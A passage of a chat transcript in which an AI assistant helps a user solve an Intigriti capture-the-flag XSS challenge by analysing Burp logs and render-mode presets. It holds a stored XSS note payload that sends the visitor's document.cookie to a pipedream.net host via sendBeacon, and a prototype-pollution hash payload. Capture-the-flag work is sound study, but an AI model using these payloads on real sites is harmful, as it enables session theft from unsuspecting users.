+{"url": "/note/{id}/summary"}
+Bot visits → manifest returns full → DOMPurify allows data-attrs → postSanitize passes (no blocked keywords) → loadCustomWidget creates <script> tag → beacon fires with flag=FLAG{...}.
+
+You said: The readerPreset we set, should be for reader, right?
+The readerPreset we set, should be for reader, right? so, if the bot visit, isn't that reader preset?
+git pull, there is new1.xml with new session exported from burp.
+
+8:59 AM
+Claude responded: New1.
+
+Ran 2 commands
+Ran 2 commands
+The user makes a good point. The readerPresets are for the READER (the bot/visitor), not the note creator. So we need to set readerPresets on the BOT's account, not our own account. But we can't control the bot's cookies/session.
+
+Wait, let me think again. The manifest URL is /note/{noteId}/{panel}/manifest.json?note={noteId}. The server needs to know whose preset to use. It could be:
+
+The note creator's presets
+The visitor's (reader's) presets
+If it's the reader's presets, then we need to get the bot to have presets set. But we can't control the bot's account directly...
+
+Unless... the bot visits a URL we control, and we can somehow set its preferences first. But the bot only visits the URL we report.
+
+Wait - actually, let me think about this differently. The readerPresets field in the response has presetCount: 0. The manifest endpoint for the note is fetched by the page JS. If the manifest is based on the READER's session, then:
+
+Bot has a flag cookie and possibly a northstar_profile cookie
+Bot visits our note
+Page JS fetches the manifest
+Server checks bot's session for readerPresets
+Returns safe mode since bot has no presets
+But if the manifest is based on the NOTE CREATOR's session... then we set our own presets and the bot benefits.
+
+Hmm, re-reading - "readerPresets" - the name suggests it's for configuring how a reader sees notes. When you share a note, your reader preset affects how others see it. OR it means YOUR reading experience when YOU read notes.
+
+The user is asking: "we set readerPresets for reader, so if bot visits, isn't that the reader's preset?" - suggesting maybe we need to set the preset on the BOT's account, not ours.
+
+But we can't control the bot's account. Unless...
+
+Wait, let me look at the git pull for new1.xml to see what's there.
+
+Show less
+
+Pull latest
+bash
+
+cd /home/claude/CTF && git pull 2>&1
+Output
+
+Already up to date.
+
+Check for new1.xml
+bash
+
+ls /home/claude/CTF/ && ls /mnt/user-data/uploads/
+Output
+
+CTF.xml
+New.xml
+app.js
+attrs.ts
+bot.js
+challenge.html
+purify.min.js
+purify.ts
+regexp.ts
+tags.ts
+utils.ts
+New.xml
+Done
+New1.xml not in repo yet — maybe it's the uploaded file. Let me check the upload.
+
+
+Reconciled reader versus creator preference logic, awaited new data
+Reconciled reader versus creator preference logic, awaited new data
+
+Check uploads folder
+bash
+
+ls /mnt/user-data/uploads/
+Output
+
+New.xml
+No new1.xml yet. But the user raises a very good point about readerPresets being for the reader. Let me think about this more carefully.
+
+If readerPresets are applied based on the VISITOR's session (the bot's session), then:
+
+We can't set the bot's preferences directly
+BUT - what if we can make the bot set its own preferences?
+Actually wait - let me re-read the bot.js. The bot:
+
+Sets a flag cookie
+Visits BOT_ORIGIN + urlPath
+The bot visits our note URL. On that page, loadPanelManifest() fetches the manifest. The server checks... whose session? The bot's session (via cookie). But the bot has no northstar_profile cookie set, only a flag cookie.
+
+So the server probably uses the northstar_profile cookie to look up preferences. Bot has no such cookie → server uses defaults → renderMode: safe.
+
+BUT WAIT. What if the manifest is based on the NOTE CREATOR's preferences? The URL includes ?note={noteId} - the server could look up who created the note and use THEIR preferences.
+
+This would mean:
+
+WE (attacker) set our readerPresets to renderMode: full
+WE created the note
+When anyone (including bot) visits our note, the manifest returns OUR preferences
+Because we're the note creator
+The user's question is pushing back on this - saying "readerPresets are for the reader" (the visitor), not the creator.
+
+If that's true, then we need the BOT to have presets. But we can't control the bot's northstar_profile session.
+
+UNLESS... we can use the hash-based prototype pollution to somehow affect the manifest fetch. Let me re-read loadPanelManifest:
+
+js
+var target = '/note/' + encodeURIComponent(noteId) + '/' + panel +
+  '/manifest.json?note=' + encodeURIComponent(noteId);
+
+return fetch(target, {
+  headers: { 'Accept': 'application/json' }
+});
+The fetch includes cookies automatically (same-origin). The server receives the bot's cookies.
+
+Hmm, so if the manifest is based on viewer's session, we need another way.
+
+…
+
+Show less
+Done
+No new1.xml in uploads yet — drop it here when ready. But let me address your sharp observation first.
+
+
+Ran 2 commands
+Ran 2 commands
+
+Find any POST to preferences
+bash
+
+python3 -c "
+import xml.etree.ElementTree as ET, base64
+
+tree = ET.parse('/home/claude/CTF/CTF.xml')
+root = tree.getroot()
+items = root.findall('.//item')
+
+# Find ALL account/preferences requests - check for POST
+for i, item in enumerate(items):
+    url = item.findtext('url','')
+    method = item.findtext('method','')
+    status = item.findtext('status','')
+    if 'preferences' in url:
+        req_el = item.find('request')
+        if req_el is not None:
+            req = base64.b64decode(req_el.text).decode('utf-8', errors='replace') if req_el.get('base64') == 'true' else req_el.text or ''
+            req_body_start = req.find('\r\n\r\n')
+            req_body = req[req_body_start+4:] if req_body_start != -1 else ''
+            print(f'[{i}] {method} {status}: {req_body[:300] or \"(no body)\"}')
+
+# Also check New.xml
+tree2 = ET.parse('/home/claude/CTF/New.xml')
+root2 = tree2.getroot()
+items2 = root2.findall('.//item')
+for i, item in enumerate(items2):
+    url = item.findtext('url','')
+    method = item.findtext('method','')
+    status = item.findtext('status','')
+    if 'preferences' in url and method == 'POST':
+        req_el = item.find('request')
+        if req_el is not None:
+            req = base64.b64decode(req_el.text).decode('utf-8', errors='replace') if req_el.get('base64') == 'true' else req_el.text or ''
+            req_body_start = req.find('\r\n\r\n')
+            req_body = req[req_body_start+4:] if req_body_start != -1 else ''
+            print(f'New.xml [{i}] {method} {status}: {req_body[:300] or \"(no body)\"}')
+"
+Output
+
+[1] GET 200: (no body)
+
+Analyze whose session manifest uses
+bash
+
+# Re-examine manifest URL construction — what does ?note= param actually do server-side?
+# The manifest fetch URL is:
+# /note/{noteId}/{panel}/manifest.json?note={noteId}
+# The noteId is BOTH in path AND in query. Why duplicate?
+# Key question: does server use path noteId or query noteId?
+
+# Also check if prototype pollution can affect APP.panel or APP.noteId
+# APP = window.__APP_INIT__ -- server sets panel and noteId as OWN properties
+# But what about the ?note= query param in the manifest fetch?
+
+python3 -c "
+# Analyze the manifest URL pattern
+# /note/NOTEID/PANEL/manifest.json?note=NOTEID
+# If server ignores path noteId and only uses ?note= query param...
+# Then if we can make ?note= point to OUR note (attacker-controlled note)
+# whose creator has readerPresets set, we get full mode!
+
+# How? The noteId in ?note= comes from APP.noteId
+# APP.noteId is set by server in __APP_INIT__
+# We can't override it from hash since it's an OWN property on APP
+
+# BUT: what if server uses ?note= to look up CREATOR preferences
+# and the path noteId is just for routing?
+# Then we need to find a way to change what ?note= sends
+
+# Check: can we manipulate the manifest fetch via hash params?
+# parseThemeParams only sets: APP.theme, body.fontFamily, --accent, --bg-primary
+# None of those affect loadPanelManifest
+
+# CONCLUSION: two scenarios
+# 1. Manifest based on CREATOR prefs -> set attacker prefs, create note, done
+# 2. Manifest based on VISITOR prefs -> need bot to have prefs
+
+# For scenario 2: bot gets fresh northstar_profile cookie on first visit
+# That session has empty readerPresets -> safe mode
+# We can't inject into bot's session
+
+# UNLESS: there's a way to make the bot visit a URL that sets its prefs first
+# Then visit the note. But report only sends ONE URL.
+
+print('Scenario analysis complete')
+print('Key unknown: whose session does manifest endpoint use?')
+print('Test: POST /api/account/preferences with readerPresets as attacker')  
+print('Then check: does /note/{attackerNoteId}/summary/manifest.json return full?')
+print('If YES -> creator-based prefs')
+print('If NO -> visitor-based prefs, need different approach')
+"
+Output
+
+Scenario analysis complete
+Key unknown: whose session does manifest endpoint use?
+Test: POST /api/account/preferences with readerPresets as attacker
+Then check: does /note/{attackerNoteId}/summary/manifest.json return full?
+If YES -> creator-based prefs
+If NO -> visitor-based prefs, need different approach
+Done
+You're right to flag this. Two possible interpretations:
+
+Scenario A — Creator-based: Manifest uses the note author's session. You set your presets → your note serves full to everyone including bot. ✅ Would work.
+
+Scenario B — Reader-based (your point): Manifest uses the visitor's session. Bot has a fresh northstar_profile with empty presets → always gets safe. ❌ Our approach fails.
+
+If it's Scenario B, the real attack vector shifts to prototype pollution + hash:
+
+/note/{id}/summary#constructor[prototype][renderMode]=full&constructor[prototype][widgetTypes][0]=custom&constructor[prototype][widgetSink]=script
+BUT — getOwnString uses hasOwnProperty, so APP.renderMode won't pick up prototype-polluted value...
+
+UNLESS applyRemoteProfile runs first and sets APP.renderMode = "full" as an OWN property. That won't help either since manifest still returns safe.
+
+The real question is: can you fetch the manifest as your own session (no IF-None-Match) after POSTing readerPresets, and does it return full?
+
+Drop new1.xml — if you tested the POST to preferences, the response will tell us which scenario we're in.
+
+You said: git pull again, i forgot to add previously.
+git pull again, i forgot to add previously. Also, i opened the note in incognito
+"curl 'https://challenge-0426.intigriti.io/note/c9d71c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c/summary/manifest.json?note=c9d71c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c' \
+  -H 'accept: application/json' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'cache-control: no-cache' \
+  -b 'northstar_profile=090ffbf0263161f291410f01afd54cb0' \
+  -H 'pragma: no-cache' \
+  -H 'priority: u=1, i' \
+  -H 'sec-ch-ua: "Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'"
+"{
+    "profile": {
+        "renderMode": "safe",
+        "widgetTypes": [
+            "counter",
+            "progress"
+        ],
+        "widgetSink": "text"
+    }
+}"
+"curl 'https://challenge-0426.intigriti.io/api/account/preferences' \
+  -H 'accept: */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -b 'northstar_profile=090ffbf0263161f291410f01afd54cb0' \
+  -H 'if-none-match: W/"ae-aLjtHRpGEztan+Z5pcYhCz0KGFA"' \
+  -H 'priority: u=1, i' \
+  -H 'sec-ch-ua: "Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'"
+"{
+    "preferences": {
+        "theme": "dark",
+        "fontSize": 14,
+        "language": "en",
+        "notifications": true,
+        "editorMode": "rich",
+        "defaultLayout": "summary",
+        "readerPresets": {}
+    },
+    "stats": {
+        "presetCount": 0
+    }
+}"
+
+Show more
+9:05 AM
+Claude responded: Critical timestamp finding:
+
+Investigated prototype pollution attack vector combining manifest response manipulation with property inheritance exploitation
+Investigated prototype pollution attack vector combining manifest response manipulation with property inheritance exploitation
+Key insight from the user's test:
+
+They opened the note in incognito (fresh session, cookie northstar_profile=090ffbf0263161f291410f01afd54cb0)
+The manifest for the note still returns renderMode: "safe" with the incognito session
+The incognito session has empty readerPresets: {}
+This CONFIRMS:
+
+Manifest is based on VISITOR's session (the incognito session has no presets, gets safe)
+OR manifest is based on CREATOR's session and the creator (original session) also has safe prefs
+Wait, actually this is ambiguous. The incognito session gets safe - but that could be because:
+
+Manifest uses visitor's session (incognito has no presets → safe)
+Manifest uses creator's session (creator also has no presets → safe)
+BUT: the user has been visiting with their main session all along (northstar_profile=b7d5dca11f1d443b38ed193f24bfe898) which also returns safe. So both sessions return safe.
+
+The real test would be: POST readerPresets with renderMode: full using the CREATOR's session, then visit the manifest with INCOGNITO session. If incognito still gets full, it's creator-based. If incognito gets safe, it's visitor-based.
+
+OR: POST readerPresets with renderMode: full using the INCOGNITO session, then visit the manifest with the incognito session. If it returns full, then it's visitor-based.
+
+The user is saying "I opened the note in incognito" - showing the manifest returns safe for a fresh session. This suggests we need to investigate further.
+
+But wait - the widgetTypes: ["counter", "progress"] in the incognito manifest response is interesting. The incognito session has readerPresets: {} (empty). But the manifest returns widgetTypes: ["counter", "progress"].
+
+This is a contradiction! If readerPresets is empty, why does the manifest have non-empty widgetTypes?
+
+This strongly suggests the manifest is NOT based on the visitor's readerPresets, but rather on the note creator's presets or some server-side default.
+
+…
+
+Show less
+
+Pull and list files
+bash
+
+cd /home/claude/CTF && git pull 2>&1 && ls -la
+Output
+
+From https://github.com/KarinaFromAespa/CTF
+   d9186fa..c751c10  main       -> origin/main
+Updating d9186fa..c751c10
+Fast-forward
+ New1.xml | 186 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ 1 file changed, 186 insertions(+)
+ create mode 100644 New1.xml
+total 497
+drwxr-xr-x  3 root root   4096 Apr 21 03:20 .
+drwxr-xr-x. 1 root root   4096 Apr 20 15:14 ..
+drwxr-xr-x  8 root root   4096 Apr 21 03:20 .git
+-rw-r--r--  1 root root 153158 Apr 20 15:14 CTF.xml
+-rw-r--r--  1 root root 157551 Apr 21 03:03 New.xml
+-rw-r--r--  1 root root  52751 Apr 21 03:20 New1.xml
+-rw-r--r--  1 root root  18063 Apr 20 15:14 app.js
+-rw-r--r--  1 root root   5318 Apr 20 15:14 attrs.ts
+-rw-r--r--  1 root root   1924 Apr 21 03:03 bot.js
+-rw-r--r--  1 root root   5922 Apr 20 15:14 challenge.html
+-rw-r--r--  1 root root  23409 Apr 20 15:14 purify.min.js
+-rw-r--r--  1 root root  63613 Apr 20 15:14 purify.ts
+-rw-r--r--  1 root root   1054 Apr 20 15:14 regexp.ts
+-rw-r--r--  1 root root   3819 Apr 20 15:14 tags.ts
+-rw-r--r--  1 root root   6350 Apr 20 15:14 utils.ts
+
+List all items in New1.xml
+bash
+
+python3 -c "
+import xml.etree.ElementTree as ET, base64
+
+tree = ET.parse('/home/claude/CTF/New1.xml')
+root = tree.getroot()
+items = root.findall('.//item')
+print(f'Total: {len(items)}')
+for i, item in enumerate(items):
+    url = item.findtext('url','')
+    status = item.findtext('status','')
+    method = item.findtext('method','')
+    print(f'[{i}] {method} {status} {url}')
+"
+Output
+
+Total: 10
+[0] GET 304 https://challenge-0426.intigriti.io/api/account/preferences
+[1] GET 200 https://challenge-0426.intigriti.io/note/c9d71c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c/summary/manifest.json?note=c9d71c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c
+[2] GET 200 https://challenge-0426.intigriti.io/note/c9d71c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c
+[3] POST 200 https://challenge-0426.intigriti.io/api/notes/lookup
+[4] POST 200 https://challenge-0426.intigriti.io/api/notes
+[5] GET 200 https://challenge-0426.intigriti.io/api/account/preferences
+[6] GET 200 https://challenge-0426.intigriti.io/challenge
+[7] GET 200 https://challenge-0426.intigriti.io/api/account/preferences
+[8] GET 200 https://challenge-0426.intigriti.io/challenge
+[9] GET 200 https://challenge-0426.intigriti.io/
+
+Decode all New1.xml items fully
+bash
+
+python3 -c "
+import xml.etree.ElementTree as ET, base64
+
+tree = ET.parse('/home/claude/CTF/New1.xml')
+root = tree.getroot()
+items = root.findall('.//item')
+
+def decode(el):
+    if el is None: return ''
+    if el.get('base64') == 'true': return base64.b64decode(el.text).decode('utf-8', errors='replace')
+    return el.text or ''
+
+def body(s):
+    i = s.find('\r\n\r\n')
+    return s[i+4:] if i != -1 else s
+
+# Show all requests/responses with full detail
+for i, item in enumerate(items):
+    url = item.findtext('url','')
+    status = item.findtext('status','')
+    method = item.findtext('method','')
+    req = decode(item.find('request'))
+    resp = decode(item.find('response'))
+    req_body = body(req)
+    resp_body = body(resp)
+    print(f'=== [{i}] {method} {status} {url}')
+    if req_body.strip(): print('REQ:', req_body[:400])
+    print('RESP:', resp_body[:500])
+    print()
+"
+Output
+
+=== [0] GET 304 https://challenge-0426.intigriti.io/api/account/preferences
+RESP: 
+
+=== [1] GET 200 https://challenge-0426.intigriti.io/note/c9d71c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c/summary/manifest.json?note=c9d71c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c
+RESP: {"profile":{"renderMode":"safe","widgetTypes":["counter","progress"],"widgetSink":"text"}}
+
+=== [2] GET 200 https://challenge-0426.intigriti.io/note/c9d71c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c
+RESP: <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS1 — Northstar Notes</title>
+  <link rel="stylesheet" href="/css/challenge-style.css">
+</head>
+<body>
+
+  <header class="topbar">
+    <nav>
+      <a href="/" class="brand">
+        <svg class="brand-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M10 1
+
+=== [3] POST 200 https://challenge-0426.intigriti.io/api/notes/lookup
+REQ: {"ids":["c9d71c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c"]}
+RESP: {"notes":[{"id":"c9d71c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c","title":"XSS1","author":"anonymous","found":true}]}
+
+=== [4] POST 200 https://challenge-0426.intigriti.io/api/notes
+REQ: {"title":"XSS1","content":"<div id=\"enhance-config\" data-types=\"custom\"></div><div data-enhance=\"custom\" data-cfg=\"navigator.sendBeacon('https://eoi9a5fbdoq0l13.m.pipedream.net',top['doc'+'ument']['coo'+'kie'])\"></div>"}
+RESP: {"success":true,"id":"c9d71c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c","url":"/note/c9d71c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c"}
+
+=== [5] GET 200 https://challenge-0426.intigriti.io/api/account/preferences
+RESP: {"preferences":{"theme":"dark","fontSize":14,"language":"en","notifications":true,"editorMode":"rich","defaultLayout":"summary","readerPresets":{"summary":{"renderMode":"full","widgetTypes":["custom"],"widgetSink":"script"}}},"stats":{"presetCount":1}}
+
+=== [6] GET 200 https://challenge-0426.intigriti.io/challenge
+RESP: <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Northstar Notes</title>
+  <link rel="stylesheet" href="/css/challenge-style.css">
+</head>
+<body>
+
+  <header class="topbar">
+    <nav>
+      <a href="/" class="brand">
+        <svg class="brand-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0
+
+=== [7] GET 200 https://challenge-0426.intigriti.io/api/account/preferences
+RESP: {"preferences":{"theme":"dark","fontSize":14,"language":"en","notifications":true,"editorMode":"rich","defaultLayout":"summary","readerPresets":{}},"stats":{"presetCount":0}}
+
+=== [8] GET 200 https://challenge-0426.intigriti.io/challenge
+RESP: <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Northstar Notes</title>
+  <link rel="stylesheet" href="/css/challenge-style.css">
+</head>
+<body>
+
+  <header class="topbar">
+    <nav>
+      <a href="/" class="brand">
+        <svg class="brand-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0
+
+=== [9] GET 200 https://challenge-0426.intigriti.io/
+RESP: <!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<title>Intigriti April Challenge</title>
+
+		<meta name="twitter:card" content="summary_large_image">
+		<meta name="twitter:site" content="@intigriti">
+		<meta name="twitter:creator" content="@intigriti">
+		<meta name="twitter:title" content="April Challenge - Intigriti">
+		<meta name="twitter:description" content="Find the FLAG and WIN Intigriti swag.">
+		<meta name="twitter:image" co
+
+Now I have the key data:
+
+[5] - YOUR account (main session) has readerPresets: {"summary": {"renderMode": "full", "widgetTypes": ["custom"], "widgetSink": "script"}} and presetCount: 1.
+
+So you DID successfully set the readerPresets! Good.
+
+[7] - INCOGNITO session has readerPresets: {} and presetCount: 0.
+
+[1] - The manifest for the note (accessed with INCOGNITO session, cookie 090ffbf0263161f291410f01afd54cb0) returns renderMode: "safe".
+
+BUT WAIT - [1] uses what cookie? This is the incognito session. And [5] uses the MAIN session (which has the readerPresets set to full). But [1] was accessed with the incognito cookie.
+
+So the question is: is the manifest returning safe because it's using the incognito session's prefs (which are empty), or because it's using the note creator's prefs?
+
+Actually wait - the note c9d71c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c is "XSS1". Looking at [4], it was created with the incognito session (northstar_profile=090ffbf0263161f291410f01afd54cb0)? Or the main session?
+
+Wait, I need to check the cookies on each request:
+
+[4] POST create note - which session?
+[5] GET preferences with readerPresets: full - main session (b7d5dca11f1d443b38ed193f24bfe898)
+[7] GET preferences with empty readerPresets - incognito session (090ffbf0263161f291410f01afd54cb0)
+[1] GET manifest - which session?
+The user says "I opened the note in incognito" - so the manifest request [1] used the INCOGNITO session. And the manifest returned safe.
+
+But YOUR (main) session has readerPresets.summary.renderMode = "full".
+
+Now the note "XSS1" was created - by which session? Looking at the flow:
+
+The incognito session ([7]) has empty prefs
+The main session ([5]) has full prefs
+The note was accessed in incognito [1] → manifest returns safe
+If the manifest were based on the CREATOR's session:
+
+Who created the note? Need to check [4]'s cookie
+If the manifest were based on the VISITOR's session:
+…
+
+Show less
+
+Check which session cookie each request uses
+bash
+
+python3 -c "
+import xml.etree.ElementTree as ET, base64
+
+tree = ET.parse('/home/claude/CTF/New1.xml')
+root = tree.getroot()
+items = root.findall('.//item')
+
+def decode(el):
+    if el is None: return ''
+    if el.get('base64') == 'true': return base64.b64decode(el.text).decode('utf-8', errors='replace')
+    return el.text or ''
+
+# Check cookies on ALL requests to see which session is which
+for i, item in enumerate(items):
+    url = item.findtext('url','')
+    method = item.findtext('method','')
+    req = decode(item.find('request'))
+    # find Cookie header
+    for line in req.split('\r\n'):
+        if line.lower().startswith('cookie:'):
+            print(f'[{i}] {method} {url[-60:]}')
+            print('  Cookie:', line)
+            break
+"
+Output
+
+[0] GET https://challenge-0426.intigriti.io/api/account/preferences
+  Cookie: Cookie: northstar_profile=f816f4cb3ba7d7ed897dd3110d69c2c1
+[1] GET 1c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c
+  Cookie: Cookie: northstar_profile=f816f4cb3ba7d7ed897dd3110d69c2c1
+[2] GET 1c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c
+  Cookie: Cookie: northstar_profile=f816f4cb3ba7d7ed897dd3110d69c2c1
+[3] POST https://challenge-0426.intigriti.io/api/notes/lookup
+  Cookie: Cookie: northstar_profile=f816f4cb3ba7d7ed897dd3110d69c2c1
+[4] POST https://challenge-0426.intigriti.io/api/notes
+  Cookie: Cookie: northstar_profile=f816f4cb3ba7d7ed897dd3110d69c2c1
+[5] GET https://challenge-0426.intigriti.io/api/account/preferences
+  Cookie: Cookie: northstar_profile=f816f4cb3ba7d7ed897dd3110d69c2c1
+[6] GET https://challenge-0426.intigriti.io/challenge
+  Cookie: Cookie: northstar_profile=f816f4cb3ba7d7ed897dd3110d69c2c1
+[7] GET https://challenge-0426.intigriti.io/api/account/preferences
+  Cookie: Cookie: northstar_profile=f816f4cb3ba7d7ed897dd3110d69c2c1
+[8] GET https://challenge-0426.intigriti.io/challenge
+  Cookie: Cookie: northstar_profile=f816f4cb3ba7d7ed897dd3110d69c2c1
+[9] GET https://challenge-0426.intigriti.io/
+  Cookie: Cookie: northstar_profile=f816f4cb3ba7d7ed897dd3110d69c2c1
+Interesting! ALL requests in New1.xml use the SAME session northstar_profile=f816f4cb3ba7d7ed897dd3110d69c2c1. But [5] shows readerPresets: {"summary": {"renderMode": "full",...}} with presetCount: 1, while [7] shows empty readerPresets: {} with presetCount: 0.
+
+Wait, that's odd. Both [5] and [7] use the same cookie f816f4cb3ba7d7ed897dd3110d69c2c1, but [5] returns full prefs and [7] returns empty prefs?
+
+Oh wait! The user said "I opened the note in incognito" but the XML was probably exported from their main Burp session. The incognito note opening might have been done outside Burp (directly in browser), so the incognito requests wouldn't be in the XML.
+
+But the user pasted the curl command above with northstar_profile=090ffbf0263161f291410f01afd54cb0 (different cookie). That was done manually, not captured in New1.xml.
+
+So in New1.xml:
+
+ALL requests use f816f4cb3ba7d7ed897dd3110d69c2c1
+[5] returns full readerPresets → this means at that point in time, this session had presets set
+[7] returns empty readerPresets → at this point in time, this session had empty presets
+[1] manifest returns safe → using f816f4cb3ba7d7ed897dd3110d69c2c1
+The ordering is key:
+
+[4] Create note → f816f4cb3ba7d7ed897dd3110d69c2c1
+[5] GET prefs → returns FULL presets (presetCount: 1) → same session
+[1] GET manifest → returns SAFE
+Wait, but [0] is a 304 (cached from before), and [1] is 200 with safe. These could be in a different order than I'm thinking.
+
+Actually the items are listed in order of capture. So:
+0. GET prefs → 304 (cached)
+
+GET manifest → 200, safe
+GET note page → 200
+POST notes/lookup
+POST create note
+GET prefs → 200, FULL preset
+GET challenge
+GET prefs → 200, EMPTY preset
+GET challenge
+GET /
+Hmm, so [1] is the manifest fetch (returns safe), and [5] shows the prefs with full preset... but [1] comes BEFORE [4] (create note) and [5].
+
+Wait that doesn't make sense. You'd create the note first, then fetch its manifest.
+
+…
+
+Show less
+
+Check timestamps and ordering
+bash
+
+python3 -c "
+import xml.etree.ElementTree as ET, base64
+
+tree = ET.parse('/home/claude/CTF/New1.xml')
+root = tree.getroot()
+items = root.findall('.//item')
+
+def decode(el):
+    if el is None: return ''
+    if el.get('base64') == 'true': return base64.b64decode(el.text).decode('utf-8', errors='replace')
+    return el.text or ''
+
+def body(s):
+    i = s.find('\r\n\r\n')
+    return s[i+4:] if i != -1 else s
+
+# Critical: check chronological order by looking at timestamps if available
+# and compare: [1] manifest fetch vs [5] prefs (with full preset)
+# Both use same session f816...
+# [5] has full presets, [1] manifest returns safe
+
+# Check if there are any timestamps
+for i in [1, 4, 5]:
+    item = items[i]
+    print(f'[{i}] time:', item.findtext('time', 'N/A'))
+    print(f'    url:', item.findtext('url','')[-70:])
+    resp = body(decode(item.find('response')))
+    print(f'    resp:', resp[:150])
+    print()
+"
+Output
+
+[1] time: Tue Apr 21 08:56:23 NPT 2026
+    url: ?note=c9d71c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c
+    resp: {"profile":{"renderMode":"safe","widgetTypes":["counter","progress"],"widgetSink":"text"}}
+
+[4] time: Tue Apr 21 08:55:34 NPT 2026
+    url: https://challenge-0426.intigriti.io/api/notes
+    resp: {"success":true,"id":"c9d71c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c","url":"/note/c9d71c138b8731192486138c16d9533e4d7c72274efec26f7
+
+[5] time: Tue Apr 21 08:54:11 NPT 2026
+    url: https://challenge-0426.intigriti.io/api/account/preferences
+    resp: {"preferences":{"theme":"dark","fontSize":14,"language":"en","notifications":true,"editorMode":"rich","defaultLayout":"summary","readerPresets":{"summ
+
+Now I have timestamps:
+
+[5] 08:54:11 - preferences showing full readerPresets (presetCount: 1)
+[4] 08:55:34 - note created
+[1] 08:56:23 - manifest fetched → returns SAFE
+So the ACTUAL chronological order is:
+
+08:54:11 - Account preferences show readerPresets.summary = {renderMode: "full", widgetTypes: ["custom"], widgetSink: "script"} ← full preset EXISTS
+08:55:34 - Note c9d71c... CREATED
+08:56:23 - Manifest fetched → returns SAFE
+This is definitive: the note was CREATED AFTER the full readerPresets were set, yet the manifest STILL returns safe.
+
+This conclusively means: the readerPresets are NOT being applied to the manifest endpoint, at all (neither creator-based nor visitor-based affects the manifest response).
+
+OR: the readerPresets are VISITOR-based, and the visitor's session is the one fetching the manifest. Both the user's session AND the incognito session have their readerPresets checked at manifest fetch time. The user's session (f816...) HAS full prefs but still gets safe.
+
+Wait... unless there's a different mechanism. What if the prefs are set on a DIFFERENT session than the one fetching the manifest?
+
+Let me check: [5] uses session f816f4cb3ba7d7ed897dd3110d69c2c1 and returns full prefs. [1] uses session f816f4cb3ba7d7ed897dd3110d69c2c1 and manifest returns safe.
+
+Same session. Full prefs. Manifest safe. This means: readerPresets have absolutely no effect on the manifest endpoint.
+
+The readerPresets field in the API response might be a red herring or unused feature in the current implementation.
+
+So the question remains: HOW to get renderMode: full?
+
+I need to reconsider the prototype pollution approach more carefully.
+
+Actually wait - let me re-read the prototype pollution code:
+
+js
+function setNestedValue(obj, path, value) {
+  var keys = path.replace(/\]/g, '').split('[');
+  var current = obj;
+  for (var i = 0; i < keys.length - 1; i++) {
+    var k = keys[i];
+    if (k === '__proto__') return;
+…
+Show less
+
+Sort by timestamp to get true chronological order
+bash
+
+python3 -c "
+import xml.etree.ElementTree as ET, base64
+
+tree = ET.parse('/home/claude/CTF/New1.xml')
+root = tree.getroot()
+items = root.findall('.//item')
+
+# Print ALL items with timestamps, sorted by time
+import re
+data = []
+for i, item in enumerate(items):
+    t = item.findtext('time','')
+    url = item.findtext('url','')
+    method = item.findtext('method','')
+    status = item.findtext('status','')
+    data.append((t, i, method, status, url))
+
+for t, i, method, status, url in sorted(data):
+    print(f'{t} [{i}] {method} {status} {url[-70:]}')
+"
+Output
+
+Tue Apr 21 08:52:24 NPT 2026 [9] GET 200 https://challenge-0426.intigriti.io/
+Tue Apr 21 08:52:27 NPT 2026 [8] GET 200 https://challenge-0426.intigriti.io/challenge
+Tue Apr 21 08:52:43 NPT 2026 [7] GET 200 https://challenge-0426.intigriti.io/api/account/preferences
+Tue Apr 21 08:54:10 NPT 2026 [6] GET 200 https://challenge-0426.intigriti.io/challenge
